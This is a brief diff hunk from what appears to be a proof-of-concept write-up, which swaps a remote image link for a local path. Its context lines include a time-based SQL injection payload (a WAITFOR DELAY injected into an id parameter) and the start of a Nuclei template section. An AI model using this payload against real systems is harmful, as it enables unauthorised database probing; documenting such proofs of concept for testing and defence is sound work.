@@ -22,7 +22,7 @@ Upgrade-Insecure-Requests: 1
 id=1';WAITFOR DELAY '0:0:3'--
 ```
 
-![8ce5da8fddd2d106e5eadb6e6c705f69](https://github.com/wy876/POC/assets/139549762/4fdf4a1c-f49a-47bc-9c1c-3d663b1d62e6)
+![8ce5da8fddd2d106e5eadb6e6c705f69](../../images/4fdf4a1c-f49a-47bc-9c1c-3d663b1d62e6.png)
 
 ## Nuclei
 ```
